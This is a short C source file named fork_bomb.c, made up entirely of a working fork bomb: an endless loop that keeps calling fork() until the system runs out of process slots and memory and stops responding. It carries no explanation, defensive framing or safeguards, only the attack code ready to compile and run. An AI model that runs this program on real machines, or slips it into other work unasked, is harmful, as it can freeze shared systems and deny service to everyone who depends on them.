// fork_bomb.c
#include <unistd.h>

int main() {
    while(1) {
        fork();
    }
    return 0;
}